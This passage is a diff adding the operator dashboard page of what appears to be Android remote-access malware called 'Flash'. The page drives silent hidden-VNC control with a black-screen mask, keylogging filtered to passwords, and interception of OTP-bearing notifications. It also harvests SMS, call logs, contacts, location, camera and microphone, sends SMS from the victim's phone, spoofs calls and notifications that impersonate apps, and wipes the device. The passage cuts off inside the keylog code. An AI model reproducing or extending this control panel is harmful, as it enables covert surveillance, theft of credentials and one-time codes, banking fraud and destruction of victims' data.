@@ -1,1 +1,773 @@
-/flash-dashboard/
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<title>Flash — Device</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+<style>
+  /* Device header */
+  .dev-header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: .6rem 1rem;
+    display: flex; align-items: center; gap: .75rem;
+    flex-shrink: 0;
+  }
+  .dev-header-info { flex: 1; min-width: 0; }
+  .dev-header-name { font-weight: 700; font-size: .95rem; }
+  .dev-header-sub  { font-size: .78rem; color: var(--text2); }
+  .dev-back {
+    background: none; border: none; cursor: pointer;
+    color: var(--text2); padding: .3rem;
+    display: flex; align-items: center;
+  }
+
+  /* HVNC */
+  .hvnc-tab { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+  .hvnc-toolbar { flex-shrink: 0; }
+  .hvnc-body { flex: 1; overflow: auto; background: #111; display: flex; align-items: flex-start; justify-content: center; }
+  .hvnc-canvas { display: block; max-width: 100%; max-height: 100%; touch-action: none; }
+  .fps-badge {
+    position: absolute; top: .4rem; right: .4rem;
+    background: rgba(0,0,0,.7); color: #0f0;
+    font-size: .7rem; font-family: monospace;
+    padding: .15rem .4rem; border-radius: 4px;
+    pointer-events: none;
+  }
+  .type-row {
+    display: flex; gap: .4rem; padding: .5rem;
+    background: var(--surface); border-top: 1px solid var(--border);
+    flex-shrink: 0;
+  }
+
+  /* Info banner */
+  .info-banner {
+    display: grid; grid-template-columns: 1fr 1fr;
+    gap: .5rem; padding: .75rem 1rem;
+    border-bottom: 1px solid var(--border);
+    background: var(--surface); flex-shrink: 0;
+  }
+  .info-item { font-size: .78rem; }
+  .info-item label { color: var(--text3); display: block; margin-bottom: .1rem; }
+  .info-item span  { color: var(--text); font-weight: 500; }
+
+  /* SMS bubbles */
+  .sms-thread {
+    display: flex; flex-direction: column; gap: .5rem;
+    padding: .75rem 1rem;
+  }
+  .sms-bubble {
+    max-width: 85%; padding: .6rem .9rem;
+    border-radius: 16px; font-size: .88rem; line-height: 1.4;
+    word-break: break-word;
+  }
+  .sms-in  { background: var(--surface2); align-self: flex-start; border-bottom-left-radius: 4px; }
+  .sms-out { background: var(--red); color: #fff; align-self: flex-end; border-bottom-right-radius: 4px; }
+  .sms-meta { font-size: .7rem; opacity: .7; margin-top: .2rem; }
+
+  /* Call type */
+  .call-icon-incoming { color: var(--green); }
+  .call-icon-outgoing { color: var(--blue); }
+  .call-icon-missed   { color: var(--red); }
+
+  /* Hierarchy viewer */
+  .hierarchy-pre {
+    padding: 1rem;
+    font-size: .78rem; font-family: monospace;
+    background: #1a1a2e; color: #e0e0ff;
+    overflow: auto; flex: 1;
+    white-space: pre-wrap; word-break: break-all;
+  }
+</style>
+</head>
+<body>
+<div class="device-layout" id="app">
+
+  <!-- Device header -->
+  <div class="dev-header">
+    <button class="dev-back" onclick="history.back()">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+        <path d="M19 12H5M12 5l-7 7 7 7"/>
+      </svg>
+    </button>
+    <div class="dev-header-info">
+      <div class="dev-header-name" id="devName">Loading…</div>
+      <div class="dev-header-sub"  id="devSub">—</div>
+    </div>
+    <div class="flex gap-2 items-center">
+      <div class="status-bar" id="connStatus">
+        <div class="dot dot-gray"></div>
+        <span>Connecting</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Info banner -->
+  <div class="info-banner" id="infoBanner" style="display:none">
+    <div class="info-item"><label>Model</label><span id="infoModel">—</span></div>
+    <div class="info-item"><label>Android</label><span id="infoAndroid">—</span></div>
+    <div class="info-item"><label>Number</label><span id="infoPhone">—</span></div>
+    <div class="info-item"><label>Battery</label><span id="infoBattery">—</span></div>
+    <div class="info-item"><label>Carrier</label><span id="infoCarrier">—</span></div>
+    <div class="info-item"><label>IP</label><span id="infoIp">—</span></div>
+  </div>
+
+  <!-- Tabs -->
+  <div class="device-tabs-wrap">
+    <div class="tabs" id="tabBar">
+      <button class="tab-btn active" data-tab="hvnc">HVNC</button>
+      <button class="tab-btn" data-tab="sms">SMS</button>
+      <button class="tab-btn" data-tab="calls">Calls</button>
+      <button class="tab-btn" data-tab="contacts">Contacts</button>
+      <button class="tab-btn" data-tab="keylog">Keylog</button>
+      <button class="tab-btn" data-tab="notifications">Notifs</button>
+      <button class="tab-btn" data-tab="commands">Commands</button>
+      <button class="tab-btn" data-tab="hierarchy">Hierarchy</button>
+    </div>
+
+    <div class="device-content">
+
+      <!-- ── HVNC Tab ───────────────────────────────────────────────────── -->
+      <div class="tab-panel active hvnc-tab" id="tab-hvnc">
+        <div class="hvnc-toolbar">
+          <div style="display:flex;align-items:center;gap:.4rem;padding:.5rem;overflow-x:auto;scrollbar-width:none;">
+            <button class="btn btn-primary btn-sm" id="hvncStart">▶ Start</button>
+            <button class="btn btn-ghost btn-sm"   id="hvncStop">■ Stop</button>
+            <button class="btn btn-ghost btn-sm"   id="hvncBlackOn">🌑 Black</button>
+            <button class="btn btn-ghost btn-sm"   id="hvncBlackOff">☀ Unblack</button>
+            <button class="btn btn-ghost btn-sm"   id="hvncHome">⌂ Home</button>
+            <button class="btn btn-ghost btn-sm"   id="hvncBack">← Back</button>
+            <button class="btn btn-ghost btn-sm"   id="hvncRecents">⊟ Recents</button>
+            <button class="btn btn-ghost btn-sm"   id="hvncLock">🔒 Lock</button>
+            <div class="fps-badge" id="fpsBadge">0 fps</div>
+          </div>
+        </div>
+        <div class="hvnc-body relative" id="hvncBody">
+          <div class="hvnc-placeholder" id="hvncPlaceholder">
+            <svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+              <rect x="5" y="2" width="14" height="20" rx="2"/>
+              <line x1="12" y1="18" x2="12.01" y2="18"/>
+            </svg>
+            <span>Tap <strong>Start</strong> to begin HVNC stream</span>
+          </div>
+          <canvas id="hvncCanvas" class="hvnc-canvas" style="display:none"></canvas>
+        </div>
+        <div class="type-row">
+          <input class="input" id="typeInput" placeholder="Type text to device…" style="flex:1">
+          <button class="btn btn-primary btn-sm" id="typeSend">Send</button>
+        </div>
+      </div>
+
+      <!-- ── SMS Tab ────────────────────────────────────────────────────── -->
+      <div class="tab-panel flex-col" id="tab-sms">
+        <div class="data-tab-header">
+          <button class="btn btn-ghost btn-sm" id="smsRefresh">↻ Refresh</button>
+          <button class="btn btn-primary btn-sm" id="smsGetBtn">Get SMS</button>
+          <div class="spinner hidden" id="smsSpinner"></div>
+          <span class="text-xs text-muted ml-auto" id="smsCount"></span>
+        </div>
+        <div class="data-tab-body" id="smsBody">
+          <div class="sms-thread" id="smsList"></div>
+        </div>
+        <!-- Compose -->
+        <div class="sms-compose">
+          <div class="sms-compose-row">
+            <input class="input" id="smsTo" placeholder="Phone number" type="tel" style="flex:1">
+          </div>
+          <div class="sms-compose-row">
+            <textarea class="input" id="smsBody" placeholder="Message…" rows="2" style="flex:1;resize:none"></textarea>
+            <button class="btn btn-primary" id="smsSendBtn" style="align-self:flex-end">Send</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── Calls Tab ──────────────────────────────────────────────────── -->
+      <div class="tab-panel flex-col" id="tab-calls">
+        <div class="data-tab-header">
+          <button class="btn btn-ghost btn-sm" id="callsRefresh">↻ Refresh</button>
+          <button class="btn btn-primary btn-sm" id="callsGetBtn">Get Calls</button>
+          <div class="spinner hidden" id="callsSpinner"></div>
+          <span class="text-xs text-muted ml-auto" id="callsCount"></span>
+        </div>
+        <div class="data-tab-body table-wrap">
+          <table class="data-table">
+            <thead><tr>
+              <th></th><th>Name</th><th>Number</th><th>Duration</th><th>Date</th><th>Type</th>
+            </tr></thead>
+            <tbody id="callsBody"></tbody>
+          </table>
+        </div>
+        <!-- Fake call -->
+        <div style="padding:.75rem 1rem;border-top:1px solid var(--border);background:var(--surface);flex-shrink:0;">
+          <div style="display:flex;gap:.5rem;align-items:center;">
+            <input class="input" id="fakeCallNumber" placeholder="Fake call number" type="tel" style="flex:1">
+            <input class="input" id="fakeCallName"   placeholder="Caller name"      style="flex:1">
+            <button class="btn btn-primary btn-sm" id="fakeCallBtn">📞 Fake</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── Contacts Tab ───────────────────────────────────────────────── -->
+      <div class="tab-panel flex-col" id="tab-contacts">
+        <div class="data-tab-header">
+          <button class="btn btn-ghost btn-sm" id="contactsRefresh">↻ Refresh</button>
+          <button class="btn btn-primary btn-sm" id="contactsGetBtn">Get Contacts</button>
+          <div class="spinner hidden" id="contactsSpinner"></div>
+          <div class="search-box" style="flex:1;max-width:200px;">
+            <svg class="search-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
+            </svg>
+            <input class="input" id="contactSearch" placeholder="Filter…" style="font-size:.8rem">
+          </div>
+        </div>
+        <div class="data-tab-body table-wrap">
+          <table class="data-table">
+            <thead><tr><th>Name</th><th>Phone</th><th>Email</th></tr></thead>
+            <tbody id="contactsBody"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- ── Keylog Tab ─────────────────────────────────────────────────── -->
+      <div class="tab-panel flex-col" id="tab-keylog">
+        <div class="data-tab-header">
+          <button class="btn btn-ghost btn-sm" id="keylogRefresh">↻ Refresh</button>
+          <button class="btn btn-primary btn-sm" id="keylogToggle">Enable Keylog</button>
+          <label style="display:flex;align-items:center;gap:.35rem;font-size:.8rem;cursor:pointer">
+            <input type="checkbox" id="keylogPassOnly"> Passwords only
+          </label>
+        </div>
+        <div class="data-tab-body" id="keylogBody" style="padding:.75rem 1rem;">
+          <div class="empty" id="keylogEmpty">
+            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+              <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+            </svg>
+            No keylogs yet
+          </div>
+        </div>
+      </div>
+
+      <!-- ── Notifications Tab ──────────────────────────────────────────── -->
+      <div class="tab-panel flex-col" id="tab-notifications">
+        <div class="data-tab-header">
+          <button class="btn btn-ghost btn-sm" id="notifsRefresh">↻ Refresh</button>
+          <label style="display:flex;align-items:center;gap:.35rem;font-size:.8rem;cursor:pointer">
+            <input type="checkbox" id="otpOnly"> OTP only
+          </label>
+        </div>
+        <div class="data-tab-body table-wrap">
+          <table class="data-table">
+            <thead><tr><th>App</th><th>Title</th><th>Body</th><th>OTP</th><th>Time</th></tr></thead>
+            <tbody id="notifsBody"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- ── Commands Tab ───────────────────────────────────────────────── -->
+      <div class="tab-panel flex-col" id="tab-commands">
+        <div class="data-tab-body overflow-y-auto">
+          <div class="cmds-grid">
+            <button class="cmd-btn" data-cmd="TOGGLE_KEYLOGGER">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              <span>Keylogger</span>
+            </button>
+            <button class="cmd-btn" data-cmd="TOGGLE_CAMERA">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
+              <span>Camera</span>
+            </button>
+            <button class="cmd-btn" data-cmd="TOGGLE_MICROPHONE">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg>
+              <span>Microphone</span>
+            </button>
+            <button class="cmd-btn" data-cmd="GET_LOCATION">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
+              <span>Location</span>
+            </button>
+            <button class="cmd-btn" data-cmd="GET_SMS">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+              <span>Get SMS</span>
+            </button>
+            <button class="cmd-btn" data-cmd="GET_CONTACTS">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+              <span>Get Contacts</span>
+            </button>
+            <button class="cmd-btn" data-cmd="GET_CALL_LOG">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13 19.79 19.79 0 0 1 1.61 4.4 2 2 0 0 1 3.6 2.21h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 9.91a16 16 0 0 0 6.06 6.06l.95-.95a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7a2 2 0 0 1 1.72 2z"/></svg>
+              <span>Get Calls</span>
+            </button>
+            <button class="cmd-btn" data-cmd="FAKE_NOTIFICATION">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+              <span>Fake Notif</span>
+            </button>
+            <button class="cmd-btn" data-cmd="REQUEST_HIERARCHY">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+              <span>Hierarchy</span>
+            </button>
+            <button class="cmd-btn" data-cmd="RING_DEVICE">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 5H6a2 2 0 0 0-2 2v11a2 2 0 0 0 2 2h11a2 2 0 0 0 2-2v-5"/><path d="M11 13l9-9"/><path d="M15 3h6v6"/></svg>
+              <span>Ring / Vibrate</span>
+            </button>
+            <button class="cmd-btn" data-cmd="TOAST_MSG">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+              <span>Toast Msg</span>
+            </button>
+            <button class="cmd-btn" data-cmd="WIPE_DEVICE" style="border-color:#fca5a5">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>
+              <span style="color:var(--red)">Wipe</span>
+            </button>
+          </div>
+
+          <!-- Fake notification compose -->
+          <div style="padding:.75rem 1rem;border-top:1px solid var(--border);margin-top:.5rem">
+            <div class="text-sm" style="font-weight:600;margin-bottom:.6rem">Fake Notification</div>
+            <div class="flex flex-col gap-2">
+              <input class="input" id="fakeNotifApp"   placeholder="App package (e.g. com.google.android.gm)">
+              <input class="input" id="fakeNotifTitle" placeholder="Notification title">
+              <input class="input" id="fakeNotifBody"  placeholder="Notification body">
+              <button class="btn btn-primary btn-sm" id="fakeNotifSend">Send Notification</button>
+            </div>
+          </div>
+
+          <!-- Toast message -->
+          <div style="padding:.75rem 1rem;border-top:1px solid var(--border)">
+            <div class="text-sm" style="font-weight:600;margin-bottom:.6rem">Show Toast</div>
+            <div class="flex gap-2">
+              <input class="input" id="toastMsgInput" placeholder="Toast message text…" style="flex:1">
+              <button class="btn btn-primary btn-sm" id="toastMsgSend">Show</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── Hierarchy Tab ───────────────────────────────────────────────── -->
+      <div class="tab-panel flex-col" id="tab-hierarchy">
+        <div class="data-tab-header">
+          <button class="btn btn-primary btn-sm" id="hierarchyRequest">Request Hierarchy</button>
+          <div class="spinner hidden" id="hierarchySpinner"></div>
+        </div>
+        <pre class="hierarchy-pre" id="hierarchyPre">Press "Request Hierarchy" to fetch accessibility tree.</pre>
+      </div>
+
+    </div><!-- /device-content -->
+  </div><!-- /device-tabs-wrap -->
+</div>
+
+<div id="toast-container"></div>
+
+<script src="/js/ws-client.js"></script>
+<script src="/js/hvnc.js"></script>
+<script>
+(async function () {
+  // ── Init ──────────────────────────────────────────────────────────────────
+  const meRes = await fetch('/auth/me');
+  if (!meRes.ok) { location.href = '/login.html'; return; }
+
+  const params   = new URLSearchParams(location.search);
+  const deviceId = params.get('id');
+  if (!deviceId) { location.href = '/'; return; }
+
+  // ── State ─────────────────────────────────────────────────────────────────
+  let hvnc       = null;
+  let deviceInfo = null;
+  let keylogOn   = false;
+  let smsList    = [];
+  let contactsAll = [];
+
+  // ── Helpers ───────────────────────────────────────────────────────────────
+  function esc(s) {
+    if (s == null) return '';
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  }
+  function fmt(ts) {
+    if (!ts) return '—';
+    return new Date(Number(ts)).toLocaleString();
+  }
+  function fmtDur(s) {
+    if (!s) return '0s';
+    const m = Math.floor(s / 60), sec = s % 60;
+    return m ? `${m}m ${sec}s` : `${sec}s`;
+  }
+  function toast(msg, type = '') {
+    const t = document.createElement('div');
+    t.className = 'toast ' + type;
+    t.textContent = msg;
+    document.getElementById('toast-container').appendChild(t);
+    setTimeout(() => t.remove(), 2800);
+  }
+
+  // ── Load device info ──────────────────────────────────────────────────────
+  fetch(`/api/device/${encodeURIComponent(deviceId)}`)
+    .then(r => r.json())
+    .then(d => {
+      deviceInfo = d;
+      document.getElementById('devName').textContent = d.alias || d.model || deviceId;
+      document.getElementById('devSub').textContent  = [d.manufacturer, d.phone_number, d.carrier].filter(Boolean).join(' · ');
+      document.getElementById('infoModel').textContent   = d.model || '—';
+      document.getElementById('infoAndroid').textContent = d.android_version || '—';
+      document.getElementById('infoPhone').textContent   = d.phone_number || '—';
+      document.getElementById('infoBattery').textContent = d.battery_level != null ? d.battery_level + '%' : '—';
+      document.getElementById('infoCarrier').textContent = d.carrier || '—';
+      document.getElementById('infoIp').textContent      = d.ip_address || '—';
+      document.getElementById('infoBanner').style.display = '';
+    })
+    .catch(() => {});
+
+  // ── WebSocket ─────────────────────────────────────────────────────────────
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  const ws    = new FlashWS(`${proto}://${location.host}/ws/dashboard`);
+
+  const statusEl = document.getElementById('connStatus');
+  function setStatus(text, cls) {
+    const dot = document.createElement('div');
+    dot.className = cls === 'connected' ? 'dot dot-green' : 'dot dot-gray';
+    statusEl.innerHTML = '';
+    statusEl.appendChild(dot);
+    statusEl.appendChild(document.createTextNode(' ' + text));
+    statusEl.className = 'status-bar ' + (cls || '');
+  }
+
+  ws.addEventListener('open', () => {
+    setStatus('Connected', 'connected');
+    // Start watching this device
+    ws.send({ type: 'watch', deviceId });
+  });
+  ws.addEventListener('close',        () => setStatus('Reconnecting…', ''));
+  ws.addEventListener('reconnecting', e  => setStatus(`Reconnect #${e.detail.attempt}…`, ''));
+
+  ws.addEventListener('binary', e => {
+    if (hvnc) hvnc.handleBinaryFrame(e.detail);
+  });
+
+  ws.addEventListener('message', e => {
+    const msg = e.detail;
+    if (msg._deviceId !== deviceId && msg.deviceId !== deviceId) return;
+
+    switch (msg.type || msg.event) {
+      case 'device_offline':
+        setStatus('Device offline', '');
+        toast('Device went offline', 'error');
+        break;
+      case 'screen_frame':
+        // JSON-encoded frame (not binary) — ignore, we handle binary above
+        break;
+      case 'keylog':
+        appendKeylog(Array.isArray(msg.data) ? msg.data : [msg]);
+        break;
+      case 'notification':
+        appendNotif(msg.data || msg);
+        break;
+      case 'location':
+        toast(`📍 ${msg.latitude || '?'}, ${msg.longitude || '?'}`);
+        break;
+      case 'hierarchy':
+        document.getElementById('hierarchySpinner').classList.add('hidden');
+        document.getElementById('hierarchyPre').textContent =
+          JSON.stringify(msg.data || msg, null, 2);
+        break;
+      case 'device_info':
+        const d = msg.data || msg;
+        if (d.batteryLevel != null) document.getElementById('infoBattery').textContent = d.batteryLevel + '%';
+        break;
+    }
+  });
+
+  // ── Tabs ──────────────────────────────────────────────────────────────────
+  document.getElementById('tabBar').addEventListener('click', e => {
+    const btn = e.target.closest('.tab-btn');
+    if (!btn) return;
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+    btn.classList.add('active');
+    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
+
+    // Auto-load data
+    if (btn.dataset.tab === 'sms'          && !smsList.length)    loadSms();
+    if (btn.dataset.tab === 'contacts'     && contactsAll.length === 0) loadContacts();
+    if (btn.dataset.tab === 'calls'        ) loadCalls();
+    if (btn.dataset.tab === 'keylog'       ) loadKeylogs();
+    if (btn.dataset.tab === 'notifications') loadNotifs();
+  });
+
+  // ── HVNC ──────────────────────────────────────────────────────────────────
+  function initHvnc() {
+    if (hvnc) return;
+    const canvas = document.getElementById('hvncCanvas');
+    canvas.style.display = '';
+    document.getElementById('hvncPlaceholder').style.display = 'none';
+    hvnc = new HvncRenderer(canvas, ws, deviceId);
+    hvnc.onFps = fps => { document.getElementById('fpsBadge').textContent = fps + ' fps'; };
+  }
+
+  document.getElementById('hvncStart').addEventListener('click', () => {
+    initHvnc();
+    ws.send({ type: 'command', deviceId, action: 'START_SILENT_VNC' });
+    toast('HVNC started');
+  });
+  document.getElementById('hvncStop').addEventListener('click', () => {
+    ws.send({ type: 'command', deviceId, action: 'STOP_VNC' });
+    toast('HVNC stopped');
+  });
+  document.getElementById('hvncBlackOn').addEventListener('click', () => {
+    ws.send({ type: 'command', deviceId, action: 'BLACK_SCREEN_ON' });
+  });
+  document.getElementById('hvncBlackOff').addEventListener('click', () => {
+    ws.send({ type: 'command', deviceId, action: 'BLACK_SCREEN_OFF' });
+  });
+  document.getElementById('hvncHome').addEventListener('click', () => {
+    ws.send({ type: 'command', deviceId, action: 'KEY', keyCode: 3 }); // KEYCODE_HOME
+  });
+  document.getElementById('hvncBack').addEventListener('click', () => {
+    ws.send({ type: 'command', deviceId, action: 'KEY', keyCode: 4 }); // KEYCODE_BACK
+  });
+  document.getElementById('hvncRecents').addEventListener('click', () => {
+    ws.send({ type: 'command', deviceId, action: 'KEY', keyCode: 187 }); // KEYCODE_APP_SWITCH
+  });
+  document.getElementById('hvncLock').addEventListener('click', () => {
+    ws.send({ type: 'command', deviceId, action: 'KEY', keyCode: 26 }); // KEYCODE_POWER
+  });
+
+  document.getElementById('typeSend').addEventListener('click', () => {
+    const text = document.getElementById('typeInput').value;
+    if (!text) return;
+    if (hvnc) hvnc.sendType(text); else ws.send({ type: 'command', deviceId, action: 'TYPE', text });
+    document.getElementById('typeInput').value = '';
+  });
+  document.getElementById('typeInput').addEventListener('keydown', e => {
+    if (e.key === 'Enter') document.getElementById('typeSend').click();
+  });
+
+  // ── SMS ───────────────────────────────────────────────────────────────────
+  async function loadSms() {
+    document.getElementById('smsSpinner').classList.remove('hidden');
+    try {
+      const res = await fetch(`/api/device/${encodeURIComponent(deviceId)}/sms`);
+      smsList = await res.json();
+      renderSms(smsList);
+    } catch { toast('Failed to load SMS', 'error'); }
+    finally { document.getElementById('smsSpinner').classList.add('hidden'); }
+  }
+
+  function renderSms(list) {
+    const el = document.getElementById('smsList');
+    document.getElementById('smsCount').textContent = list.length + ' messages';
+    if (!list.length) {
+      el.innerHTML = '<div class="empty"><span>No messages</span></div>';
+      return;
+    }
+    el.innerHTML = list.map(s => `
+      <div>
+        <div class="text-xs text-muted" style="margin-bottom:.2rem">${esc(s.address || '?')} · ${fmt(s.date)}</div>
+        <div class="sms-bubble ${s.type === 2 ? 'sms-out' : 'sms-in'}">
+          ${esc(s.body || '')}
+          <div class="sms-meta">${s.type === 2 ? 'Sent' : 'Received'}</div>
+        </div>
+      </div>
+    `).join('');
+    el.scrollTop = el.scrollHeight;
+  }
+
+  document.getElementById('smsRefresh').addEventListener('click', loadSms);
+  document.getElementById('smsGetBtn').addEventListener('click', () => {
+    ws.send({ type: 'command', deviceId, action: 'GET_SMS' });
+    toast('Requested SMS from device');
+  });
+
+  document.getElementById('smsSendBtn').addEventListener('click', async () => {
+    const to   = document.getElementById('smsTo').value.trim();
+    const body = document.getElementById('smsBody').value.trim();
+    if (!to || !body) { toast('Enter number and message', 'error'); return; }
+    ws.send({ type: 'command', deviceId, action: 'SEND_SMS', phoneNo: to, smsText: body });
+    toast('SMS sent via device', 'success');
+    document.getElementById('smsBody').value = '';
+  });
+
+  // ── Calls ─────────────────────────────────────────────────────────────────
+  async function loadCalls() {
+    document.getElementById('callsSpinner').classList.remove('hidden');
+    try {
+      const res  = await fetch(`/api/device/${encodeURIComponent(deviceId)}/calls`);
+      const list = await res.json();
+      document.getElementById('callsCount').textContent = list.length + ' records';
+      const tbody = document.getElementById('callsBody');
+      const callTypeLabel = t => t === 1 ? 'Incoming' : t === 2 ? 'Outgoing' : t === 3 ? 'Missed' : '?';
+      const callTypeClass = t => t === 1 ? 'call-icon-incoming' : t === 2 ? 'call-icon-outgoing' : 'call-icon-missed';
+      tbody.innerHTML = list.map(c => `
+        <tr>
+          <td><span class="${callTypeClass(c.type)}">●</span></td>
+          <td class="truncate">${esc(c.name || '—')}</td>
+          <td>${esc(c.number || '—')}</td>
+          <td>${fmtDur(c.duration)}</td>
+          <td style="white-space:nowrap">${fmt(c.date)}</td>
+          <td>${callTypeLabel(c.type)}</td>
+        </tr>
+      `).join('');
+    } catch { toast('Failed to load calls', 'error'); }
+    finally { document.getElementById('callsSpinner').classList.add('hidden'); }
+  }
+
+  document.getElementById('callsRefresh').addEventListener('click', loadCalls);
+  document.getElementById('callsGetBtn').addEventListener('click', () => {
+    ws.send({ type: 'command', deviceId, action: 'GET_CALL_LOG' });
+    toast('Requested call log from device');
+  });
+
+  document.getElementById('fakeCallBtn').addEventListener('click', () => {
+    const number = document.getElementById('fakeCallNumber').value.trim();
+    const name   = document.getElementById('fakeCallName').value.trim();
+    if (!number) { toast('Enter a phone number', 'error'); return; }
+    ws.send({ type: 'command', deviceId, action: 'FAKE_CALL', phoneNo: number, name: name || number });
+    toast('Fake call triggered', 'success');
+  });
+
+  // ── Contacts ──────────────────────────────────────────────────────────────
+  async function loadContacts() {
+    document.getElementById('contactsSpinner').classList.remove('hidden');
+    try {
+      const res = await fetch(`/api/device/${encodeURIComponent(deviceId)}/contacts`);
+      contactsAll = await res.json();
+      renderContacts(contactsAll);
+    } catch { toast('Failed to load contacts', 'error'); }
+    finally { document.getElementById('contactsSpinner').classList.add('hidden'); }
+  }
+
+  function renderContacts(list) {
+    const tbody = document.getElementById('contactsBody');
+    tbody.innerHTML = list.map(c => `
+      <tr>
+        <td class="truncate">${esc(c.name || '—')}</td>
+        <td>${esc(c.phone || '—')}</td>
+        <td class="truncate">${esc(c.email || '—')}</td>
+      </tr>
+    `).join('');
+  }
+
+  document.getElementById('contactsRefresh').addEventListener('click', loadContacts);
+  document.getElementById('contactsGetBtn').addEventListener('click', () => {
+    ws.send({ type: 'command', deviceId, action: 'GET_CONTACTS' });
+    toast('Requested contacts from device');
+  });
+  document.getElementById('contactSearch').addEventListener('input', e => {
+    const q = e.target.value.toLowerCase();
+    renderContacts(q ? contactsAll.filter(c =>
+      (c.name||'').toLowerCase().includes(q) || (c.phone||'').includes(q)
+    ) : contactsAll);
+  });
+
+  // ── Keylog ────────────────────────────────────────────────────────────────
+  async function loadKeylogs() {
+    try {
+      const res  = await fetch(`/api/device/${encodeURIComponent(deviceId)}/keylogs`);
+      const list = await res.json();
+      appendKeylog(list, true);
+    } catch {}
+  }
+
+  function appendKeylog(entries, replace = false) {
+    const container = document.getElementById('keylogBody');
+    const passOnly  = document.getElementById('keylogPassOnly').checked;
+    if (replace) container.innerHTML = '';
+    document.getElementById('keylogEmpty').style.display = 'none';
+
+    for (const e of entries) {
+      if (passOnly && !e.is_password && !e.isPassword) continue;
+      const div = document.createElement('div');
+      div.className = 'keylog-entry' + (e.is_password || e.isPassword ? ' is-password' : '');
+      div.innerHTML = `
+        ${e.is_password || e.isPassword ? `<span class="keylog-pass-label">PASSWORD</span>` : ''}
+        <div class="keylog-app">${esc(e.app_name || e.appName || 'Unknown app')}</div>
+        <div class="keylog-text">${esc(e.text || e.key || '')}</div>
